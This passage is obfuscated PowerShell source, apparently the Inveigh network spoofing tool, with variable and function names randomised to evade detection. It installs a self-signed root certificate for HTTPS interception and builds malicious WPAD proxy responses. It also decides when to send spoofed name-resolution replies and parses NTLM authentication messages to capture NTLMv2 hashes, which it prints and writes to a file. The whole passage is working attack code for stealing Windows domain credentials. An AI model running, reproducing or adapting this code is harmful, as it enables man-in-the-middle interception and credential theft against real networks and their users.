			    $nhvwKyaQ99.InitializeEncode($ZAxIueXK99)
			    $dRyvirrT99 = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
			    $dRyvirrT99.InitializeFromPrivateKey(2,$nauuGoDP99,"")
			    $dRyvirrT99.Subject = $QqGXpBaZ99
			    $dRyvirrT99.Issuer = $bwMKEZNR99
			    $dRyvirrT99.NotBefore = (Get-Date).AddDays(-271)
			    $dRyvirrT99.NotAfter = $dRyvirrT99.NotBefore.AddDays(824)
			    $cEZxqEVq99 = New-Object -ComObject X509Enrollment.CObjectId
			    $cEZxqEVq99.InitializeFromAlgorithmName(1,0,0,"SHA256")
			    $dRyvirrT99.HashAlgorithm = $cEZxqEVq99
                $dRyvirrT99.X509Extensions.Add($nhvwKyaQ99)
                $TKhTgoua99 = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
			    $TKhTgoua99.InitializeEncode("true",1)
                $dRyvirrT99.X509Extensions.Add($TKhTgoua99)
                $dRyvirrT99.Encode()
                $vEGVuztZ99 = new-object -com "X509Enrollment.CX509Enrollment"
			    $vEGVuztZ99.InitializeFromRequest($dRyvirrT99)
			    $OVIvjIKF99 = $vEGVuztZ99.CreateRequest(0)
                $vEGVuztZ99.InstallResponse(2,$OVIvjIKF99,0,"")
                $wzCNZfgp99.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $wzCNZfgp99.certificate_issuer})
            }
            else
            {
                
                if($tQETvOZJ99 -eq 'Y')
                {
                    $wzCNZfgp99.HTTPS_force_certificate_delete = $true
                }
                $wzCNZfgp99.HTTPS_existing_certificate = $true
                $wzCNZfgp99.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
            }
            
            $wzCNZfgp99.HTTPS = $true
            if($UbhtORQL99 -ne '0.0.0.0')
            { 
                $wzCNZfgp99.output_queue.Add("[+] HTTPS IP = $UbhtORQL99") > $null
            }
            if($ErJSnLHL99 -ne 443)
            {   
                $wzCNZfgp99.output_queue.Add("[+] HTTPS Port = $ErJSnLHL99") > $null
            }
            $wzCNZfgp99.output_queue.Add("[+] HTTPS Capture = Enabled")  > $null
        }
        catch
        {
            $HTTPS = "N"
            $wzCNZfgp99.HTTPS = $false
            $wzCNZfgp99.output_queue.Add("[-] HTTPS Capture Disabled Due To Certificate Error")  > $null
        }
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] HTTPS Capture = Disabled")  > $null
}
if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{
    $wzCNZfgp99.output_queue.Add("[+] HTTP/HTTPS Authentication = $mQkdAcSO99")  > $null
    if($uzYCVpkd99 -and !$SvQlrCWB99)
    {
        $wzCNZfgp99.output_queue.Add("[+] HTTP/HTTPS Directory = $uzYCVpkd99")  > $null
        if($OHQVRNnZ99)
        {
            $wzCNZfgp99.output_queue.Add("[+] HTTP/HTTPS Default Response File = $OHQVRNnZ99")  > $null
        }
        if($DYCiYqcl99)
        {
            $wzCNZfgp99.output_queue.Add("[+] HTTP/HTTPS Default Response Executable = $DYCiYqcl99")  > $null
        }
    }
    if($SvQlrCWB99)
    {
        $wzCNZfgp99.output_queue.Add("[+] HTTP/HTTPS Response = Enabled")  > $null
    }
    if($SvQlrCWB99 -or $uzYCVpkd99 -and $nKkxBvGh99 -ne 'html/text')
    {
        $wzCNZfgp99.output_queue.Add("[+] HTTP/HTTPS/Proxy Content Type = $nKkxBvGh99")  > $null
    }
    if($mQkdAcSO99 -eq 'Basic' -or $cWbsxIoQ99 -eq 'Basic')
    {
        $wzCNZfgp99.output_queue.Add("[+] Basic Authentication Realm = $ronDUKWy99")  > $null
    }
    if($ISkZwfFc99)
    {
        foreach($JtKEUgqy99 in $ISkZwfFc99)
        {
            $gYYlcOGj99 += 'if (dnsDomainIs(host, "' + $JtKEUgqy99 + '")) return "DIRECT";'
        }
    }
    if($Proxy -eq 'Y')
    {
        if($CNTpZrSy99)
        {
            $Proxy = "N"
            $wzCNZfgp99.output_queue.Add("[-] Proxy Capture Disabled Due To In Use Port $SvSyggKE99")  > $null
        }
        else
        {
            $wzCNZfgp99.output_queue.Add("[+] Proxy Capture = Enabled")  > $null
            $wzCNZfgp99.output_queue.Add("[+] Proxy Port = $SvSyggKE99") > $null
            $wzCNZfgp99.output_queue.Add("[+] Proxy Authentication = $jgnMssFI99")  > $null
            $llDMmDEg99 = $SvSyggKE99 + 1
            $xZwnRmnl99 = ($xZwnRmnl99 | Where-Object {$_ -and $_.Trim()})
            if($xZwnRmnl99.Count -gt 0)
            {
                $wzCNZfgp99.output_queue.Add("[+] Proxy Ignore List = " + ($xZwnRmnl99 -join ","))  > $null
            }
            if($uXKhDCWf99 -eq '0.0.0.0')
            {
                $wAetQFzQ99 = $IP
            }
            else
            {
                $wAetQFzQ99 = $uXKhDCWf99
            }
            if($tMqwMtTz99 -and $pJbruVRt99)
            {
                $mooPFzLL99 = "function FindProxyForURL(url,host){$gYYlcOGj99 return `"PROXY $wAetQFzQ99`:$SvSyggKE99; PROXY $tMqwMtTz99`:$pJbruVRt99; DIRECT`";}"
            }
            else
            {
                $mooPFzLL99 = "function FindProxyForURL(url,host){$gYYlcOGj99 return `"PROXY $wAetQFzQ99`:$SvSyggKE99; PROXY $wAetQFzQ99`:$llDMmDEg99; DIRECT`";}"
            }
        }
    }
    $wzCNZfgp99.output_queue.Add("[+] WPAD Authentication = $cWbsxIoQ99")  > $null
    if($cWbsxIoQ99 -like "NTLM*")
    {
        $GvqEXUZu99 = ($GvqEXUZu99 | Where-Object {$_ -and $_.Trim()})
        if($GvqEXUZu99.Count -gt 0)
        {
            $wzCNZfgp99.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($GvqEXUZu99 -join ","))  > $null
        }
    }
    if($ISkZwfFc99)
    {
        $wzCNZfgp99.output_queue.Add("[+] WPAD Direct Hosts = " + ($ISkZwfFc99 -join ","))  > $null
    }
    if($mooPFzLL99 -and $Proxy -eq 'N')
    {
        $wzCNZfgp99.output_queue.Add("[+] WPAD Response = Enabled")  > $null
    }
    elseif($mooPFzLL99 -and $Proxy -eq 'Y')
    {
        $wzCNZfgp99.output_queue.Add("[+] WPAD Proxy Response = Enabled")  > $null
        if($tMqwMtTz99 -and $pJbruVRt99)
        {
            $wzCNZfgp99.output_queue.Add("[+] WPAD Failover = $tMqwMtTz99`:$pJbruVRt99")  > $null
        }
    }
    elseif($tMqwMtTz99 -and $pJbruVRt99)
    {
        $wzCNZfgp99.output_queue.Add("[+] WPAD Response = Enabled")  > $null
        $wzCNZfgp99.output_queue.Add("[+] WPAD = $tMqwMtTz99`:$pJbruVRt99")  > $null
        
        if($ISkZwfFc99)
        {
            foreach($JtKEUgqy99 in $ISkZwfFc99)
            {
                $gYYlcOGj99 += 'if (dnsDomainIs(host, "' + $JtKEUgqy99 + '")) return "DIRECT";'
            }
            $mooPFzLL99 = "function FindProxyForURL(url,host){" + $gYYlcOGj99 + "return `"PROXY " + $tMqwMtTz99 + ":" + $pJbruVRt99 + "`";}"
            $wzCNZfgp99.output_queue.Add("[+] WPAD Direct Hosts = " + ($ISkZwfFc99 -join ","))  > $null
        }
        else
        {
            $mooPFzLL99 = "function FindProxyForURL(url,host){$gYYlcOGj99 return `"PROXY $tMqwMtTz99`:$pJbruVRt99; DIRECT`";}"
        }
    }
    if($OpSametq99)
    {
        $wzCNZfgp99.output_queue.Add("[+] HTTP NTLM Challenge = $OpSametq99")  > $null
    }
}
if($YQiNABub99 -eq 'Y')
{
    $wzCNZfgp99.output_queue.Add("[+] Kerberos TGT Capture = Enabled")  > $null
    $wzCNZfgp99.output_queue.Add("[+] Kerberos TGT File Output Count = $NkBYNNgQ99")  > $null
    
    if($kvoRCffi99.Count -gt 0)
    {
        $wzCNZfgp99.output_queue.Add("[+] Kerberos TGT Host Header List = " + ($kvoRCffi99 -join ","))  > $null
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] Kerberos TGT Capture = Disabled")  > $null    
}
if($hNaHSLnV99 -eq 'N')
{
    $wzCNZfgp99.output_queue.Add("[+] Machine Account Capture = Disabled")  > $null
    $wzCNZfgp99.machine_accounts = $false
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] Machine Account Capture = Enabled")  > $null
    $wzCNZfgp99.machine_accounts = $true
}
if($liSaTCmu99 -ne 'N')
{
    if($liSaTCmu99 -ne 'N')
    {
        if($liSaTCmu99 -eq 'Y')
        {
            $wzCNZfgp99.output_queue.Add("[+] Console Output = Full")  > $null
        }
        else
        {
            $wzCNZfgp99.output_queue.Add("[+] Console Output = $liSaTCmu99")  > $null
        }
    }
    $wzCNZfgp99.console_output = $true
    if($TwzNLFBf99 -eq 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] Console Status = $TwzNLFBf99 Minute")  > $null
    }
    elseif($TwzNLFBf99 -gt 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] Console Status = $TwzNLFBf99 Minutes")  > $null
    }
}
else
{
    if($wzCNZfgp99.tool -eq 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] Console Output Disabled Due To External Tool Selection")  > $null
    }
    else
    {
        $wzCNZfgp99.output_queue.Add("[+] Console Output = Disabled")  > $null
    }
}
if($hpsuzKWY99 -eq 'Y')
{
    $wzCNZfgp99.console_unique = $true
}
else
{
    $wzCNZfgp99.console_unique = $false
}
if($OYEydmkn99 -eq 'Y' -or ($YQiNABub99 -eq 'Y' -and $NkBYNNgQ99 -gt 0) -or ($Pcap -eq 'File' -and ($CBlLlQgp99 -or $oCOyAgdf99)))
{
    
    if($OYEydmkn99 -eq 'Y')
    {
        $wzCNZfgp99.output_queue.Add("[+] File Output = Enabled")  > $null
        $wzCNZfgp99.file_output = $true
    }
    if($Pcap -eq 'File')
    {
        $wzCNZfgp99.output_queue.Add("[+] Pcap Output = File") > $null
        
        if($CBlLlQgp99)
        {
            $wzCNZfgp99.output_queue.Add("[+] Pcap TCP Ports = " + ($CBlLlQgp99 -join ","))  > $null
        }
        if($oCOyAgdf99)
        {
            $wzCNZfgp99.output_queue.Add("[+] Pcap UDP Ports = " + ($oCOyAgdf99 -join ","))  > $null
        }
    }
    $wzCNZfgp99.output_queue.Add("[+] Output Directory = $HHgEZHCn99")  > $null 
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] File Output = Disabled")  > $null
}
if($Pcap -eq 'Memory')
{
    $wzCNZfgp99.output_queue.Add("[+] Pcap Output = Memory")
}
if($LiCXQovl99 -eq 'Y')
{
    $wzCNZfgp99.file_unique = $true
}
else
{
    $wzCNZfgp99.file_unique = $false
}
if($amzQkCjG99 -eq 'Y')
{
    $wzCNZfgp99.log_output = $true
}
else
{
    $wzCNZfgp99.log_output = $false
}
if($GIZTcqVL99)
{
    $wzCNZfgp99.output_queue.Add("[+] Run Count = $GIZTcqVL99") > $null
}
if($gyFkhRAU99 -eq 1)
{
    $wzCNZfgp99.output_queue.Add("[+] Run Time = $gyFkhRAU99 Minute")  > $null
}
elseif($gyFkhRAU99 -gt 1)
{
    $wzCNZfgp99.output_queue.Add("[+] Run Time = $gyFkhRAU99 Minutes")  > $null
}
if($nOCBdgwy99 -eq 'Y')
{
    $wzCNZfgp99.output_queue.Add("[!] Run selenium to stop")  > $null
    if($wzCNZfgp99.console_output)
    {
        $wzCNZfgp99.output_queue.Add("[*] Press any key to stop console output")  > $null
    }
}
while($wzCNZfgp99.output_queue.Count -gt 0)
{
    switch -Wildcard ($wzCNZfgp99.output_queue[0])
    {
        {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
        {
            if($wzCNZfgp99.status_output -and $wzCNZfgp99.output_stream_only)
            {
                Write-Output($wzCNZfgp99.output_queue[0] + $wzCNZfgp99.newline)
            }
            elseif($wzCNZfgp99.status_output)
            {
                Write-Warning($wzCNZfgp99.output_queue[0])
            }
            if($wzCNZfgp99.file_output)
            {
                $wzCNZfgp99.log_file_queue.Add($wzCNZfgp99.output_queue[0]) > $null
            }
            if($wzCNZfgp99.log_output)
            {
                $wzCNZfgp99.log.Add($wzCNZfgp99.output_queue[0]) > $null
            }
            $wzCNZfgp99.output_queue.RemoveAt(0)
        }
        default
        {
            if($wzCNZfgp99.status_output -and $wzCNZfgp99.output_stream_only)
            {
                Write-Output($wzCNZfgp99.output_queue[0] + $wzCNZfgp99.newline)
            }
            elseif($wzCNZfgp99.status_output)
            {
                Write-Output($wzCNZfgp99.output_queue[0])
            }
            if($wzCNZfgp99.file_output)
            {
                if ($wzCNZfgp99.output_queue[0].StartsWith("[+] ") -or $wzCNZfgp99.output_queue[0].StartsWith("[*] "))
                {
                    $wzCNZfgp99.log_file_queue.Add($wzCNZfgp99.output_queue[0]) > $null
                }
                else
                {
                    $wzCNZfgp99.log_file_queue.Add("[redacted]") > $null    
                }
            }
            if($wzCNZfgp99.log_output)
            {
                $wzCNZfgp99.log.Add($wzCNZfgp99.output_queue[0]) > $null
            }
            $wzCNZfgp99.output_queue.RemoveAt(0)
        }
    }
}
$wzCNZfgp99.status_output = $false
$qDhCcAQO99 =
{
    function articulations
    {
        param ([Int]$Start,[Byte[]]$Data)
        $XCcsyuSZ99 = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)
        return $XCcsyuSZ99
    }
    function jockstraps
    {
        param ([Int]$Start,[Byte[]]$Data)
        $XCcsyuSZ99 = [System.BitConverter]::ToUInt32($Data[$Start..($Start + 3)],0)
        return $XCcsyuSZ99
    }
    function candies
    {
        param ([Int]$Start,[Int]$IsUQwhEP99,[Byte[]]$Data)
        $ErvjzQsR99 = [System.BitConverter]::ToString($Data[$Start..($Start + $IsUQwhEP99 - 1)])
        $ErvjzQsR99 = $ErvjzQsR99 -replace "-00",""
        $ErvjzQsR99 = $ErvjzQsR99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $mItRkaGw99 = New-Object System.String ($ErvjzQsR99,0,$ErvjzQsR99.Length)
        return $mItRkaGw99
    }
    function Convert-DataToUInt16($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt16($field,0)
    }
    function Convert-DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt32($field,0)
    }
    function appraisers
    {
        param ([String]$SfjCtTyl99,[String]$Type,[String]$NIPYKgLe99,[String]$HEKGWWAq99,[byte]$LhUjVByd99)
        if($SfjCtTyl99 -like "*.*")
        {
            [Array]$rAoVXgwQ99 = $SfjCtTyl99.Split('.')
            $MkfollYD99 = $rAoVXgwQ99[0]
        }
        $GbWlnxDd99 = "[+]"
        if($FpxqDLtp99)
        {
            $MMmcGApp99 = "[inspect only]"
        }
        elseif($HEKGWWAq99 -eq 'N')
        {
            $MMmcGApp99 = "[spoofer disabled]"
        }
        elseif($aaGIoVaU99 -and ($aaGIoVaU99 -notcontains $SfjCtTyl99 -and $aaGIoVaU99 -notcontains $MkfollYD99))
        {
            $MMmcGApp99 = "[$SfjCtTyl99 not on reply list]"
        }
        elseif($DzGorPak99 -contains $SfjCtTyl99 -or $DzGorPak99 -contains $MkfollYD99)
        {
            $MMmcGApp99 = "[$SfjCtTyl99 is on ignore list]"
        }
        elseif($VBgThnPx99 -and $VBgThnPx99 -notcontains $vngeYplM99)
        {
            $MMmcGApp99 = "[$vngeYplM99 not on reply list]"
        }
        elseif($SDnpWGxP99 -contains $vngeYplM99)
        {
            $MMmcGApp99 = "[$vngeYplM99 is on ignore list]"
        }
        elseif($wzCNZfgp99.valid_host_list -contains $lpVoCdor99 -and ($aaGIoVaU99 -notcontains $SfjCtTyl99 -and $aaGIoVaU99 -notcontains $MkfollYD99))
        {
            $MMmcGApp99 = "[$lpVoCdor99 is a valid host]"
        }
        elseif($WfEKENoc99 -eq 'Y' -and $wzCNZfgp99.IP_capture_list -contains $vngeYplM99.IPAddressToString)
        {
            $MMmcGApp99 = "[previous $vngeYplM99 capture]"
        }
        elseif($Type -eq 'NBNS' -and $vngeYplM99.IPAddressToString -eq $IP)
        {
            $MMmcGApp99 = "[local query]"
        }
        elseif($TureDGKs99 -eq 'Y' -or $eqnDzsgQ99 -and $iXTVNwdE99.Elapsed -lt $vZVTKZqz99)
        {
            $MMmcGApp99 = ": " + [Int]($eqnDzsgQ99 - $iXTVNwdE99.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
        }
        elseif($Type -eq 'NBNS' -and $tPiDssiv99 -notcontains $DPpOatzL99)
        {
            $MMmcGApp99 = "[NBNS type disabled]"
        }
        elseif($Type -eq 'NBNS' -and $LhUjVByd99 -eq 33)
        {
            $MMmcGApp99 = "[NBSTAT request]"
        }
        elseif($rosmaqHG99 -eq 'Y' -and $Type -ne 'mDNS' -and $Type -ne 'DNS' -and $bynIJRfn99.IPAddressToString -eq $IP)
        {
            $MMmcGApp99 = "[possible ResponderGuard request ignored]"
            $GbWlnxDd99 = "[!]"
        }
        elseif($Type -eq 'mDNS' -and $NIPYKgLe99 -and $GSmWUQVj99 -notcontains $NIPYKgLe99)
        {
            $MMmcGApp99 = "[mDNS type disabled]"
        }
        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $aqPCuNat99 -gt 0 -and @($wzCNZfgp99.request_table.$SfjCtTyl99 | Where-Object {$_ -match $vngeYplM99.IPAddressToString}).Count -le $aqPCuNat99)
        {
            $MMmcGApp99 = "[SpooferThresholdHost >= $(@($wzCNZfgp99.request_table.$SfjCtTyl99 | Where-Object {$_ -match $vngeYplM99.IPAddressToString}).Count)]"
        }
        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $UlUbQxYF99 -gt 0 -and @($wzCNZfgp99.request_table.$SfjCtTyl99 | Sort-Object | Get-Unique).Count -le $UlUbQxYF99)
        {
            $MMmcGApp99 = "[SpooferThresholdNetwork >= $(@($wzCNZfgp99.request_table.$SfjCtTyl99 | Sort-Object | Get-Unique).Count)]"
        }
        elseif($SfjCtTyl99 -match '[^\x00-\x7F]+')
        {
            $MMmcGApp99 = "[nonprintable characters]"
        }
        else
        {
            $MMmcGApp99 = "[response sent]"
        }
        return $GbWlnxDd99,$MMmcGApp99
    }
    function Get-NBNSQueryType([String]$dcIqLZtV99)
    {
        switch ($dcIqLZtV99)
        {
            '41-41'
            {
                $DPpOatzL99 = "00"
            }
            '41-42'
            {
                $DPpOatzL99 = "01"
            }
            '41-43'
            {
                $DPpOatzL99 = "02"
            }
            '41-44'
            {
                $DPpOatzL99 = "03"
            }
            '43-41'
            {
                $DPpOatzL99 = "20"
            }
            '42-4C'
            {
                $DPpOatzL99 = "1B"
            }
            '42-4D'
            {
                $DPpOatzL99 = "1C"
            }
            '42-4E'
            {
                $DPpOatzL99 = "1D"
            }
            '42-4F'
            {
                $DPpOatzL99 = "1E"
            }
        }
        return $DPpOatzL99
    }
    function Get-NameQueryString([Int]$Index, [Byte[]]$VEwVlVUB99)
    {
        $BBfVKHmZ99 = $VEwVlVUB99[12]
        if($BBfVKHmZ99 -gt 0)
        {
            $i = 0
            $rpCmUdFU99 = ''
            do
            {
                $rpCmUdFU99 += [System.Text.Encoding]::UTF8.GetString($VEwVlVUB99[($Index + 1)..($Index + $BBfVKHmZ99)])
                $Index += $BBfVKHmZ99 + 1
                $BBfVKHmZ99 = $VEwVlVUB99[$Index]
                $i++
                if($BBfVKHmZ99 -gt 0)
                {
                    $rpCmUdFU99 += "."
                }
            }
            until($BBfVKHmZ99 -eq 0 -or $i -eq 127)
            
        }
        return $rpCmUdFU99
    }
    function madrasahs
    {
        param($mppnHbLo99)
        foreach($field in $mppnHbLo99.Values)
        {
            $fZzJPyoJ99 += $field
        }
        return $fZzJPyoJ99
    }
    function certifies
    {
        param ($IP,$gcdpCjEe99,$gKppUFfP99,$pwivefkX99,$oiJLwjsK99,$xVEYaeme99,$WisOMRvt99,$ShkfcLqf99,$vwKqKrSr99,
        $FPPyxYsi99,$SMB2,$gTPBKjHD99,$WwDuwDjP99,$vGmgWIcS99,$xTXUALnq99,$qnWvVent99)
        if($gKppUFfP99 -and $gKppUFfP99 -isnot [Array]){$gKppUFfP99 = @($gKppUFfP99)}
        if($pwivefkX99 -and $pwivefkX99 -isnot [Array]){$pwivefkX99 = @($pwivefkX99)}
        if($oiJLwjsK99 -and $oiJLwjsK99 -isnot [Array]){$oiJLwjsK99 = @($oiJLwjsK99)}
        if($xVEYaeme99 -and $xVEYaeme99 -isnot [Array]){$xVEYaeme99 = @($xVEYaeme99)}
        if($WisOMRvt99 -and $WisOMRvt99 -isnot [Array]){$WisOMRvt99 = @($WisOMRvt99)}
        if($ShkfcLqf99 -and $ShkfcLqf99 -isnot [Array]){$ShkfcLqf99 = @($ShkfcLqf99)}
        if($vwKqKrSr99 -and $vwKqKrSr99 -isnot [Array]){$vwKqKrSr99 = @($vwKqKrSr99)}
        if($FPPyxYsi99 -and $FPPyxYsi99 -isnot [Array]){$FPPyxYsi99 = @($FPPyxYsi99)}
        $DqTzYdTZ99 = New-Object PSObject
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Index" $wzCNZfgp99.enumerate.Count
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Hostname" $gcdpCjEe99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Sessions" $gKppUFfP99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Administrator Users" $pwivefkX99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Administrator Groups" $oiJLwjsK99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Privileged" $xVEYaeme99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Shares" $WisOMRvt99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "NetSessions" $ShkfcLqf99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "NetSessions Mapped" $vwKqKrSr99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Local Users" $FPPyxYsi99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "SMB2.1" $SMB2
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Signing" $gTPBKjHD99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "SMB Server" $WwDuwDjP99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Targeted" $vGmgWIcS99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Enumerate" $YBskHaSV99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Execute" $NPzDmrfm99
        return $DqTzYdTZ99
    }
    function sewerage
    {
        param ([String]$gJEKQvQm99,[String]$NtaSIdse99,[String]$gcdpCjEe99,[String]$IP)
        if($wzCNZfgp99.domain_mapping_table.$gJEKQvQm99)
        {
            $lnnWyXyw99 = ($NtaSIdse99 + "@" + $wzCNZfgp99.domain_mapping_table.$gJEKQvQm99).ToUpper()
            $USkgjWns99 = ($gcdpCjEe99 + "." + $wzCNZfgp99.domain_mapping_table.$gJEKQvQm99).ToUpper()
        }
        else
        {
            $lnnWyXyw99 = $gJEKQvQm99 + "\" + $NtaSIdse99
        }
        for($i = 0;$i -lt $wzCNZfgp99.enumerate.Count;$i++)
        {
            if($wzCNZfgp99.enumerate[$i].Hostname -eq $USkgjWns99 -or $wzCNZfgp99.enumerate[$i].IP -eq $IP)
            {
                if(!$wzCNZfgp99.enumerate[$i].Hostname)
                {
                    $wzCNZfgp99.enumerate[$CrbNztYx99].Hostname = $USkgjWns99
                }
                [Array]$mRBiDkXA99 = $wzCNZfgp99.enumerate[$i].Sessions
                if($wzCNZfgp99.domain_mapping_table.$gJEKQvQm99)
                {
                    for($j = 0;$j -lt $mRBiDkXA99.Count;$j++)
                    {
                        if($mRBiDkXA99[$j] -like "$gJEKQvQm99\*")
                        {
                            $xrDzFZHR99 = ($mRBiDkXA99[$j].Split("\"))[1]
                            $DsyNehUB99 = $xrDzFZHR99 + "@" + $wzCNZfgp99.domain_mapping_table.$gJEKQvQm99
                            $mRBiDkXA99[$j] += $DsyNehUB99
                            $wzCNZfgp99.enumerate[$i].Sessions = $mRBiDkXA99
                        }
                    }
                }
                if($mRBiDkXA99 -notcontains $lnnWyXyw99)
                {
                    $mRBiDkXA99 += $lnnWyXyw99
                    $wzCNZfgp99.enumerate[$i].Sessions = $mRBiDkXA99
                }
                $rCCfYyLJ99 = $true
                break
            }
        }
     
        if(!$rCCfYyLJ99)
        {
            $wzCNZfgp99.enumerate.Add((certifies -IP $IP -gcdpCjEe99 $USkgjWns99 -gKppUFfP99 $lnnWyXyw99)) > $null
        }
    }
    
}
$DhwNtqxV99 =
{
    function chrysalises
    {
        param ([Byte[]]$aqeEUOdc99,[String]$EtSpsbJY99,[String]$ysNJdeDt99,[String]$dAOLFIPT99,[String]$Port,[String]$qOyIAfVB99)
        $CzPqmPOx99 = [System.BitConverter]::ToString($aqeEUOdc99)
        $CzPqmPOx99 = $CzPqmPOx99 -replace "-",""
        $hdyXPgrM99 = $CzPqmPOx99.IndexOf("4E544C4D53535000")
        $lnnWyXyw99 = "$ysNJdeDt99`:$dAOLFIPT99"
        if($hdyXPgrM99 -ge 0 -and $CzPqmPOx99.SubString(($hdyXPgrM99 + 16),8) -eq "03000000")
        {
            $mpwhgCET99 = $hdyXPgrM99 / 2
            $VgdNUvdI99 = articulations ($mpwhgCET99 + 12) $aqeEUOdc99
            $ulSTDCMn99 = jockstraps ($mpwhgCET99 + 16) $aqeEUOdc99
            $OdpyuMTp99 = [System.BitConverter]::ToString($aqeEUOdc99[($mpwhgCET99 + $ulSTDCMn99)..($mpwhgCET99 + $ulSTDCMn99 + $VgdNUvdI99 - 1)]) -replace "-",""
            $faiIyCXF99 = articulations ($mpwhgCET99 + 20) $aqeEUOdc99
            $GFwIEEfw99 = jockstraps ($mpwhgCET99 + 24) $aqeEUOdc99
            $CFPCzYul99 = [System.BitConverter]::ToString($aqeEUOdc99[($mpwhgCET99 + $GFwIEEfw99)..($mpwhgCET99 + $GFwIEEfw99 + $faiIyCXF99 - 1)]) -replace "-",""
            $JaWsMLqV99 = articulations ($mpwhgCET99 + 28) $aqeEUOdc99
            $RhNblTJt99 = jockstraps ($mpwhgCET99 + 32) $aqeEUOdc99
            if($JaWsMLqV99 -gt 0)
            {
                $QsNmRzDJ99 = candies ($mpwhgCET99 + $RhNblTJt99) $JaWsMLqV99 $aqeEUOdc99
            }
            $sErNjbDt99 = articulations ($mpwhgCET99 + 36) $aqeEUOdc99
            $QsbYSdMA99 = jockstraps ($mpwhgCET99 + 40) $aqeEUOdc99
            $rJDtIBah99 = candies ($mpwhgCET99 + $QsbYSdMA99) $sErNjbDt99 $aqeEUOdc99
            $rCkqlsSw99 = articulations ($mpwhgCET99 + 44) $aqeEUOdc99
            $TgkpZaGi99 = jockstraps ($mpwhgCET99 + 48) $aqeEUOdc99
            $XOzfIVQP99 = candies ($mpwhgCET99 + $TgkpZaGi99) $rCkqlsSw99 $aqeEUOdc99
            if($qOyIAfVB99 -eq "SMB")
            {
                $pyGKsWFU99 = $wzCNZfgp99.SMB_session_table.$lnnWyXyw99
            }
            else
            {
                $pyGKsWFU99 = $wzCNZfgp99.HTTP_session_table.$lnnWyXyw99
            }
            
            if($faiIyCXF99 -gt 24)
            {
                if($pyGKsWFU99)
                {
                    $oWFSDktw99 = $CFPCzYul99.Insert(32,':')
                    $EgCpJbra99 = $rJDtIBah99 + "::" + $QsNmRzDJ99 + ":" + $pyGKsWFU99 + ":" + $oWFSDktw99
                    if($EtSpsbJY99 -eq 'Y')
                    {
                        if($wzCNZfgp99.machine_accounts -or (!$wzCNZfgp99.machine_accounts -and -not $rJDtIBah99.EndsWith('$')))
                        {
                            $wzCNZfgp99.NTLMv2_list.Add($EgCpJbra99) > $null
                            if(!$wzCNZfgp99.console_unique -or ($wzCNZfgp99.console_unique -and $wzCNZfgp99.NTLMv2_username_list -notcontains "$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99"))
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv2 captured for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:") > $null
                                $wzCNZfgp99.output_queue.Add($EgCpJbra99) > $null
                            }
                            else
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv2 captured for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:`n[not unique]") > $null
                            }
                            if($wzCNZfgp99.file_output -and (!$wzCNZfgp99.file_unique -or ($wzCNZfgp99.file_unique -and $wzCNZfgp99.NTLMv2_username_list -notcontains "$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99")))
                            {
                                $wzCNZfgp99.NTLMv2_file_queue.Add($EgCpJbra99) > $null
                                $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv2 written to " + "Inveigh-NTLMv2.txt") > $null
                            }
                            if($wzCNZfgp99.NTLMv2_username_list -notcontains "$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99")
                            {
                                $wzCNZfgp99.NTLMv2_username_list.Add("$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99") > $null
                            }
